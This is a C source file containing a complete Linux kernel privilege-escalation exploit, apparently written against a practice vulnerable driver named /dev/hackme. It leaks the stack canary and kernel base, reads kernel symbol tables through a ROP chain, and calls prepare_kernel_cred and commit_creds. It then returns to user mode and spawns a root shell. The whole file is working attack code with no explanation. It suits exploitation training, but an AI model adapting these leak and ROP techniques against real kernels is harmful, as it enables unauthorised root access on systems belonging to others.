// gcc exploit.c -masm=intel -static -no-pie -o exploit

#include <stdio.h>
#include <stdint.h>
#include <fcntl.h>
#include <sys/mman.h>

size_t read(int fd, void *buf, size_t count);
size_t write(int fd, void *buf, size_t count);
int open(const char* pathname, int flags, ...);
int close(int fd);
void *mmap(void *addr, size_t length, int prot, int flags, int fd, off_t offset);
int mprotect(void *addr, size_t len, int prot);
int munmap(void *addr, size_t length);
int ioctl(int fd, unsigned long request, ...);
int execve(const char *filename, char *const argv[], char *const envp[]);
void exit(int status);

void *memset(void *s, int c, size_t n);
void *memcpy(void *dest, const void *src, size_t n);
size_t strlen(const char *s);
int puts(const char *s);
static void dump(void *buf, unsigned int size);

struct state {
	void* rip;
	uint64_t cs;
	uint64_t rflags;
	void* rsp;
	uint64_t ss;
} stat;

static void save_state(void);
void shell(void);

/* exploit */
#define BASE			0xffffffff81000000
#define OFFSET(addr)	((addr) - (BASE))
#define ADDR(offset)	(kernel_base + (offset))

uint64_t kernel_base				= 0;
uint64_t ofs_do_syscall_64			= OFFSET(0xffffffff8100a120);
uint64_t ofs_ret2usermode			= OFFSET(0xffffffff81200f10);	// swapgs_restore_regs_and_return_to_usermode
uint64_t ofs_ksymtab_prepare_kernel_cred	= OFFSET(0xffffffff81f8d4fc);
uint64_t ofs_ksymtab_commit_creds			= OFFSET(0xffffffff81f87d90);
uint64_t ofs_pop_rax				= OFFSET(0xffffffff81004d11);	// pop rax ; ret
uint64_t ofs_mov_rax_mem			= OFFSET(0xffffffff81015a7f);	// mov rax, qword [rax] ; pop rbp ; ret
uint64_t ofs_pop_rdi				= OFFSET(0xffffffff81006370);	// pop rdi ; ret
uint64_t ofs_pop_rcx				= OFFSET(0xffffffff81004857);	// pop rcx ; pop rbp ; ret
uint64_t ofs_mov_rdi_rax			= OFFSET(0xffffffff8100aedf); 	// mov rdi, rax ; rep movsq  ; pop rbp ; ret

uint64_t canary;

static uint64_t read64(int fd, uint64_t addr);

void main(void){
	int fd;
	uint64_t buf[63];
	uint64_t *p = &buf[20];

	save_state();

	fd = open("/dev/hackme", O_RDWR);
	read(fd, buf, sizeof(buf));
	// dump(buf, sizeof(buf));

	canary = buf[16];
	printf("[+] canary		= %#016lx\n", canary);

	uint64_t do_syscall_64 = buf[38] - 0x37;
	kernel_base = do_syscall_64 - ofs_do_syscall_64;
	printf("[+] kernel_base		= %#016lx\n", kernel_base);

	uint64_t prepare_kernel_cred = ADDR(ofs_ksymtab_prepare_kernel_cred) + (int32_t)read64(fd, ADDR(ofs_ksymtab_prepare_kernel_cred));
	uint64_t commit_creds = ADDR(ofs_ksymtab_commit_creds) + (int32_t)read64(fd, ADDR(ofs_ksymtab_commit_creds));
	printf("[+] prepare_kernel_cred = %#016lx\n", prepare_kernel_cred);
	printf("[+] commit_creds 	= %#016lx\n", commit_creds);

	memset(buf, 0, sizeof(buf));
	buf[16] = canary;

	*p++ = ADDR(ofs_pop_rdi);
	*p++ = 0;
	*p++ = prepare_kernel_cred;
	*p++ = ADDR(ofs_pop_rcx);
	*p++ = 0;
	*p++ = 0xdeadbeef;
	*p++ = ADDR(ofs_mov_rdi_rax);
	*p++ = 0xdeadbeef;
	*p++ = commit_creds;
	*p++ = ADDR(ofs_ret2usermode + 0x16);

	stat.rip = shell;
	memcpy(p+2, &stat, sizeof(stat));
	write(fd, buf, sizeof(buf));
	__builtin_unreachable();
}

static uint64_t read64(int fd, uint64_t addr){
	register void *rsp asm("rsp");
	register uint64_t rax asm("rax");
	uint64_t buf[63] = {};
	uint64_t *p = &buf[20];

	buf[16] = canary;
	*p++ = ADDR(ofs_pop_rax);
	*p++ = addr;
	*p++ = ADDR(ofs_mov_rax_mem);
	*p++ = 0xdeadbeef;
	*p++ = ADDR(ofs_ret2usermode + 0x16);

	asm(
	"push rbx\n"
	"push rbp\n"
	);
	stat.rsp = rsp;
	stat.rip = &&CONT;
	memcpy(p+2, &stat, sizeof(stat));
	write(fd, buf, sizeof(buf));

CONT:
	asm(
	"pop rbp\n"
	"pop rbx\n"
	);
	return rax;
}

/* auxiliary functions */
static void save_state(void) {
	register void *rsp asm("rsp");

	asm(
	"mov rax, ss\n"
	"push rax\n"
	"lea rax, [rsp+0x18]\n"
	"push rax\n"
	"pushfq\n"
	"mov rax, cs\n"
	"push rax\n"
	"mov rax, [rbp+8]\n"
	"push rax\n"
	);
	memcpy(&stat, rsp, sizeof(stat));
    asm("add rsp, 0x28");
}

void shell(void){
	char *argv[] = {"/bin/sh", NULL};
	execve(argv[0], argv, NULL);
}

/* utils */
void *memset(void *s, int c, size_t n){
	for(int i=0; i<n; i++)
		*(char*)(s+i) = (char)c;
	return s;
}

void *memcpy(void *dest, const void *src, size_t n){
	for(int i=0; i<n; i++)
		*(char*)(dest+i) = *(char*)(src+i);
	return dest;
}

size_t strlen(const char *s){
	uint64_t i;
	for(i=0; s[i]; i++);
	return i;
}

int puts(const char *s){
	int n;

	n = write(1, (void*)s, strlen(s));
	write(1, "\n", 1);

	return n;
}

#ifdef USE_STDLIB
static void dump(void *buf, unsigned int size){
	uint64_t *p = buf;

	printf("=== DUMP (%p-%p) ===\n", buf, buf+size);
	for(unsigned int i=0; i<size/8; i++){
		printf("%016lx ", p[i]);
		if(i%4 == 3)
			printf("\n");
	}
	printf("\n");
}
#else
static void dump(void *buf, unsigned int size) {
	unsigned char *tb = buf;
	char sym[] = "0123456789abcdef";

	if (!tb)
		return;

	for (unsigned int i=0; i<size; i++) {
		write(1, &sym[(tb[i]&0xf0) >> 4], 1);
		write(1, &sym[(tb[i]&0x0f) >> 0], 1);
		write(1, " ", 1);
		if(i%16 == 15)
			write(1, " ", 1);
		if(i%64 == 63)
			write(1, "\n", 1);
	}
	write(1, "\n", 1);
}
#endif

asm(
"read:\n"
"mov rax, 0\n"
"syscall\n"
"ret\n"

"write:\n"
"mov rax, 1\n"
"syscall\n"
"ret\n"

"open:\n"
"mov rax, 2\n"
"syscall\n"
"ret\n"

"close:\n"
"mov rax, 3\n"
"syscall\n"
"ret\n"

"mmap:\n"
"mov rax, 9\n"
"mov r10, rcx\n"
"syscall\n"
"ret\n"

"mprotect:\n"
"mov rax, 10\n"
"syscall\n"
"ret\n"

"munmap:\n"
"mov rax, 11\n"
"syscall\n"
"ret\n"

"ioctl:\n"
"mov rax, 16\n"
"syscall\n"
"ret\n"

"execve:\n"
"mov rax, 59\n"
"syscall\n"
"ret\n"

"exit:\n"
"mov rax, 60\n"
"syscall\n"
);

